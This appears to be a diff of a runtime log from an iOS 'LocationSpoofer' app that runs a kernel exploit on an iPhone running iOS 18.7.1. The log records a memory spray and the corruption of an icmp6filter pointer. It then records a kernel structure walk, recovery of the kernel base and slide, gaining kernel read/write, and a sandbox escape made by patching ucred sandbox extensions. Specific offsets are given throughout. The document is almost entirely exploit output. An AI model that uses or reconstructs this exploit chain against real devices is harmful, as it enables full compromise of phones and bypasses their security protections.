@@ -1,55 +1,55 @@
-[09:01:20] ========== SESSION START ==========
-[09:01:20] Device : iPhone17,5
-[09:01:20] iOS    : 18.7.1
-[09:01:20] Kernel : 24.6.0
-[09:01:20] Log    : /private/var/mobile/Documents/LocationSpooferLogs/logs.txt
-[09:01:20] ===================================
-[09:01:20] Log cleared by user
-[09:01:20] runExploit: using auto t1sz_boot
-[09:01:20] runExploit: setting log/progress callbacks
-[09:01:20] runExploit: calling ds_run_safe()...
-[09:01:20] CrashGuard: installing signal handlers
-[09:01:20] CrashGuard: calling ds_run()...
-[09:01:20] [ds_run] progress: 0.0%
-[09:01:20] [ds_run] starting darksword
-[09:01:20] [ds_run] progress: 10.0%
-[09:01:20] [ds_run] device: iPhone17,5
-[09:01:20] [ds_run] ispac: yes
-[09:01:20] [ds_run] running on a18 device
-[09:01:28] [ds_run] read_fd: 0x5
-[09:01:28] [ds_run] write_fd: 0x6
-[09:01:28] [ds_run] executable_path:       /private/var/containers/Bundle/Application/C9690E81-AFB9-4C4F-834A-1183B19A89FD/LocationSpoofer.app/LocationSpoofer
-[09:01:28] [ds_run] host_executable_path:  /private/var/containers/Bundle/Application/C9690E81-AFB9-4C4F-834A-1183B19A89FD/LocationSpoofer.app/LocationSpoofer
-[09:01:28] [ds_run] guest_executable_name: LocationSpoofer
-[09:01:28] [ds_run] host_executable_name:  LocationSpoofer
-[09:01:28] [ds_run] kernel_process_name:   LocationSpoofer
-[09:01:28] [ds_run] livecontainer_bundle:  no
-[09:01:28] [ds_run] livecontainer_guest:   no
-[09:01:28] [ds_run] rehosted_process:      no
-[09:01:28] [ds_run] process_marker 0: LocationSpoofer
-[09:01:28] [ds_run] executable_name: LocationSpoofer
-[09:01:28] [ds_run] free_thread_arg: 0x158c20000
-[09:01:28] [ds_run] progress: 30.0%
-[09:01:28] [ds_run] physical_mapping_address: 0x1158a4000
-[09:01:28] [ds_run] pc_object: 0x430b
-[09:01:28] [ds_run] pc_address: 0x16ed38000
-[09:01:28] [ds_run] allocating wired memory (131072 entries)...
-[09:01:30] [ds_run] allocating wired memory done
-[09:01:30] [ds_run] progress: 51.0%
-[09:01:30] [ds_run] seeking_offset: 0x14000: found wired_page: 0x317bf0000
-[09:01:30] [ds_run] progress: 59.1%
-[09:01:30] [ds_run] seeking_offset: 0x78000: found wired_page: 0x1642f0000
-[09:01:30] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] seeking_offset: 0x34000: found wired_page: 0x317b98000
-[09:01:31] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] seeking_offset: 0x20000: found wired_page: 0x152514000
-[09:01:31] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] seeking_offset: 0x64000: found wired_page: 0x1577d4000
-[09:01:31] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] seeking_offset: 0xb4000: found wired_page: 0x1680dc000
-[09:01:31] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] seeking_offset: 0x158000: found wired_page: 0x17c6f4000
-[09:01:31] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] seeking_offset: 0xd0000: found wired_page: 0x316cb8000
-[09:01:31] [ds_run] progress: 59.1%
-[09:01:31] [ds_run] waiting for zone trimming...
+[09:01:52] [ds_run] seeking_offset: 0xe8000: found wired_page: 0x138280000
+[09:01:52] [ds_run] progress: 59.1%
+[09:01:52] [ds_run] seeking_offset: 0x180000: found wired_page: 0x165cac000
+[09:01:52] [ds_run] progress: 59.1%
+[09:01:53] [ds_run] seeking_offset: 0x1d8000: found wired_page: 0x31460c000
+[09:01:53] [ds_run] progress: 59.1%
+[09:01:53] [ds_run] matched PCB via process marker: LocationSpoofer
+[09:01:53] [ds_run] pcb_start_offset: 0x0
+[09:01:53] [ds_run] target_inp_gencnt: 0x5f600
+[09:01:53] [ds_run] inp_list_next_pointer: 0xffffffeafc9ac400
+[09:01:53] [ds_run] icmp6filter: 0xffffffed11a87b40
+[09:01:53] [ds_run] corrupting icmp6filter pointer...
+[09:01:53] [ds_run] target corrupted: 0xffffffeafc9ac548
+[09:01:53] [ds_run] found control_socket at idx: 0x24fe
+[09:01:53] [ds_run] seeking_offset: 0x20000: found PCB page
+[09:01:53] [ds_run] progress: 70.0%
+[09:01:53] [ds_run] highest_success_idx: 498
+[09:01:53] [ds_run] success_read_count: 174
+[09:01:53] [ds_run] progress: 80.0%
+[09:01:53] [ds_run] walking kernel structures...
+[09:01:53] [ds_run] control_socket_pcb: 0xffffffeafc9ac000
+[09:01:53] [ds_run] pcbinfo_pointer: 0xfffffff0524de790
+[09:01:53] [ds_run] ipi_zone: 0xfffffff04f254f20
+[09:01:53] [ds_run] zv_name: 0xfffffff04e6a2513
+[09:01:53] [ds_run] searching for kernel mach-o header from 0xfffffff04e6a0000...
+[09:01:53] [ds_run] candidate mach-o at 0xfffffff04e630000: filetype=2 cpuinfo=0x2c0000002 (iter=28)
+[09:01:53] [ds_run] candidate mach-o at 0xfffffff04e628000: filetype=12 cpuinfo=0xc00000002 (iter=30)
+[09:01:53] [ds_run] found mh_fileset header at 0xfffffff04e628000
+[09:01:53] [ds_run] t1sz_boot: 0x11
+[09:01:53] [ds_run] kernel_base:  0xfffffff04e628000
+[09:01:53] [ds_run] kernel_slide: 0x47624000
+[09:01:53] [ds_run] progress: 99.0%
+[09:01:53] [ds_run] iOS 18: using so_count offset 0x254
+[09:01:53] [ds_run] kernel r/w is ready!
+[09:01:53] [ds_run] progress: 99.0%
+[09:01:53] [ds_run] our_proc: 0xffffffe92def6410
+[09:01:53] [ds_run] our_task: 0xffffffe92def6b50
+[09:01:53] CrashGuard: ds_run() returned 0
+[09:01:53] runExploit: ds_run_safe() returned 0, ds_is_ready=YES, resolved_t1sz=0x00
+[09:01:53] Kernel R/W acquired — initialising VFS...
+[09:01:53] vfs_init() = 0, vfs_isready() = true
+[09:01:53] Escaping sandbox...
+[09:01:53] [sbx] proc=0xffffffe92def6410 proc_ro_raw=0xffffffe7fa025718 proc_ro=0xffffffe7fa025718
+[09:01:53] [sbx] scanning proc_ro for ucred...
+[09:01:53] [sbx]   proc_ro+0x10: raw=0x2cf smr=0x2cf pac=0x2cf
+[09:01:53] [sbx]   proc_ro+0x18: raw=0x1000007dd smr=0x1000007dd pac=0x1000007dd
+[09:01:53] [sbx]   proc_ro+0x20: raw=0x2200230100000001 smr=0x230100000001 pac=0x230100000001
+[09:01:53] [sbx]   proc_ro+0x28: raw=0xffffffe847fb3d30 smr=0xffffffe847fb3d30 pac=0xffffffe847fb3d30
+[09:01:53] [sbx] found ucred at proc_ro+0x28 (SMR) = 0xffffffe847fb3d30
+[09:01:53] [sbx] ucred=0xffffffe847fb3d30 label=0xffffffe847dc7480 sandbox=0xffffffe847e750c0 ext_set=0xffffffe8484b3280
+[09:01:53] [sbx] patched 5 extensions
+[09:01:53] [sbx] filled 11 empty hash slots
+[09:01:53] [sbx] escaped!
+[09:01:53] sbx_escape() = ok — sandbox removed
+[09:01:53] All systems ready — exploit complete
